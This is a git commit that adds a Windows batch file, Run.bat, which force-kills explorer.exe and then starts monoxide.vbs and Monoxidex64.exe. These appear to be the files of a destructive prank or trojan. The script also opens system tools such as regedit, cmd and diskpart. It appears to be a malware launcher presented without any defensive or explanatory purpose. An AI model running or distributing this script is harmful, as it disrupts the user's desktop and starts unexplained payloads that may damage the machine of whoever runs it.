f28282c2ef6566fe871e1086bebb659d8767b440
Leon01TP12 <142297446+Leon01TP12@users.noreply.github.com>
2023-08-18 09:41:36 +0200

    Create Run.bat

---
+++ Run.bat
@@ -0,0 +1,15 @@
+@echo off
+taskkill /f /im explorer.exe
+pause
+start monoxide.vbs
+start regedit
+start cmd
+start tasklist
+start taskkill
+start Monoxidex64.exe
+start taskmrg
+start bootmgr
+start diskpart
+start explorer
+pause
+start temp
